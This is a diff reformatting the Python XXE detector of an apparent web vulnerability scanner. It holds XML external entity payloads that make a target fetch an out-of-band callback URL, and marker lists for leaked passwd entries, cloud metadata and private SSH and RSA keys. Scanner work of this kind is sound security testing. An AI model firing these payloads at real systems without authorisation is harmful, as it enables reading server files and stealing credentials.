@@ -19,7 +19,6 @@ Features:
      - OOB Interactsh confirmation
 """
 
-
 from __future__ import annotations
 
 import asyncio
@@ -63,18 +62,41 @@ _SVG_PAYLOAD = (
 
 # File content markers to detect (never include path components from payloads)
 _CONTENT_MARKERS: tuple[str, ...] = (
-    "root:x:0:0:", "daemon:x:", "bin:x:", "nobody:x:", "www-data:x:",
-    "[fonts]", "[extensions]", "; for 16-bit app support",
-    "ami-id", "availability-zone", "local-ipv4",
-    "ssh-rsa", "BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY",
+    "root:x:0:0:",
+    "daemon:x:",
+    "bin:x:",
+    "nobody:x:",
+    "www-data:x:",
+    "[fonts]",
+    "[extensions]",
+    "; for 16-bit app support",
+    "ami-id",
+    "availability-zone",
+    "local-ipv4",
+    "ssh-rsa",
+    "BEGIN RSA PRIVATE KEY",
+    "BEGIN OPENSSH PRIVATE KEY",
 )
 
 # Error strings that indicate the XML was parsed (entity resolution attempted)
 _XML_PARSE_ERROR_MARKERS: tuple[str, ...] = (
-    "xml parsing", "xml syntax", "xmlparseerror", "parseerror",
-    "entity", "dtd", "xml.etree", "lxml", "expat", "saxparseexception",
-    "external entity", "systemid", "javax.xml", "org.xml.sax",
-    "could not load", "no such file", "connection refused",
+    "xml parsing",
+    "xml syntax",
+    "xmlparseerror",
+    "parseerror",
+    "entity",
+    "dtd",
+    "xml.etree",
+    "lxml",
+    "expat",
+    "saxparseexception",
+    "external entity",
+    "systemid",
+    "javax.xml",
+    "org.xml.sax",
+    "could not load",
+    "no such file",
+    "connection refused",
 )
 
 
@@ -109,14 +131,11 @@ class XXEDetector:
             try:
                 oob_url = self.interactsh.generate_oob_url("xxe")
                 oob_payload = (
-                    f'<?xml version="1.0"?><!DOCTYPE foo ['
-                    f'<!ENTITY % ext SYSTEM "{oob_url}"> %ext;'
-                    f']><foo>trigger</foo>'
+                    f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % ext SYSTEM "{oob_url}"> %ext;]><foo>trigger</foo>'
                 )
                 # Simpler variant too
                 all_payloads.append(
-                    f'<?xml version="1.0"?><!DOCTYPE foo ['
-                    f'<!ENTITY xxe SYSTEM "{oob_url}">]><foo>&xxe;</foo>'
+                    f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{oob_url}">]><foo>&xxe;</foo>'
                 )
                 all_payloads.append(oob_payload)
             except Exception as exc:
@@ -125,16 +144,12 @@ class XXEDetector:
 
         # ── Engine 1: All params, standard XML submission ──────────────
         for param_name in list(params.keys()):
-            f = await self._test_param(
-                context, target, method, url, param_name, params, all_payloads
-            )
+            f = await self._test_param(context, target, method, url, param_name, params, all_payloads)
             if f:
                 findings.append(f)
 
         # ── Engine 2: Raw XML body POST (Content-Type: application/xml) ─
-        raw_findings = await self._scan_raw_xml_body(
-            context, target, url, params, all_payloads
-        )
+        raw_findings = await self._scan_raw_xml_body(context, target, url, params, all_payloads)
         findings.extend(raw_findings)
 
         # ── Engine 3: SVG upload XXE ───────────────────────────────────
@@ -143,9 +158,7 @@ class XXEDetector:
 
         # ── Engine 4: OOB confirmation (after triggering) ─────────────
         if oob_url and self.interactsh and not findings:
-            oob_finding = await self._confirm_oob(
-                context, target, method, url, params, oob_url
-            )
+            oob_finding = await self._confirm_oob(context, target, method, url, params, oob_url)
             if oob_finding:
                 findings.append(oob_finding)
 
@@ -170,13 +183,9 @@ class XXEDetector:
 
         try:
             if method == "GET":
-                r0 = await context.request.get(
-                    url, params=all_params, headers={"Referer": target}, timeout=3000
-                )
+                r0 = await context.request.get(url, params=all_params, headers={"Referer": target}, timeout=3000)
             else:
-                r0 = await context.request.post(
-                    url, data=all_params, headers={"Referer": target}, timeout=3000
-                )
+                r0 = await context.request.post(url, data=all_params, headers={"Referer": target}, timeout=3000)
             baseline_body = await r0.text()
             baseline_status = r0.status
         except Exception as exc:
@@ -194,10 +203,18 @@ class XXEDetector:
                     resp = await context.request.post(url, data=test_params, headers=hdrs, timeout=3000)
                 body = await resp.text()
 
-                f = self._evaluate(baseline_body, baseline_status, body, resp,
-                                   target, url, method, param_name,
-                                   "query" if method == "GET" else "body",
-                                   payload)
+                f = self._evaluate(
+                    baseline_body,
+                    baseline_status,
+                    body,
+                    resp,
+                    target,
+                    url,
+                    method,
+                    param_name,
+                    "query" if method == "GET" else "body",
+                    payload,
+                )
                 if f:
                     return f
             except Exception as exc:
@@ -222,7 +239,7 @@ class XXEDetector:
         findings: list[Finding] = []
 
         # Baseline with minimal valid XML
-        baseline_xml = "<?xml version=\"1.0\"?><root/>"
+        baseline_xml = '<?xml version="1.0"?><root/>'
         try:
             r0 = await context.request.post(
                 url,
@@ -244,9 +261,9 @@ class XXEDetector:
                     timeout=3000,
                 )
                 body = await resp.text()
-                f = self._evaluate(baseline_body, baseline_status, body, resp,
-                                   target, url, "POST", "__xml_body__",
-                                   "raw_xml", payload)
+                f = self._evaluate(
+                    baseline_body, baseline_status, body, resp, target, url, "POST", "__xml_body__", "raw_xml", payload
+                )
                 if f:
                     findings.append(f)
                     break
@@ -289,9 +306,9 @@ class XXEDetector:
                 pass
 
             body = await r0.text()
-            f = self._evaluate(baseline_body, r0.status, body, r0,
-                               target, url, "POST", "__svg_body__",
-                               "svg_upload", _SVG_PAYLOAD)
+            f = self._evaluate(
+                baseline_body, r0.status, body, r0, target, url, "POST", "__svg_body__", "svg_upload", _SVG_PAYLOAD
+            )
             if f:
                 findings.append(f)
         except Exception as exc:
@@ -317,10 +334,7 @@ class XXEDetector:
             return None
         try:
             await self.interactsh.register()
-            trigger_payload = (
-                f'<?xml version="1.0"?><!DOCTYPE foo ['
-                f'<!ENTITY xxe SYSTEM "{oob_url}">]><foo>&xxe;</foo>'
-            )
+            trigger_payload = f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{oob_url}">]><foo>&xxe;</foo>'
             hdrs = {"Referer": target, "Content-Type": "application/xml"}
             param_name = list(params.keys())[0] if params else "__xml_body__"
             test_params = dict(params)
@@ -385,10 +399,7 @@ class XXEDetector:
             stripped = stripped.replace(form.lower(), "")
 
         # 1. File-content leak
-        content_matches = [
-            m for m in _CONTENT_MARKERS
-            if m.lower() in stripped and m.lower() not in baseline_lower
-        ]
+        content_matches = [m for m in _CONTENT_MARKERS if m.lower() in stripped and m.lower() not in baseline_lower]
         if content_matches:
             signals.append("content_leak")
             for m in content_matches:
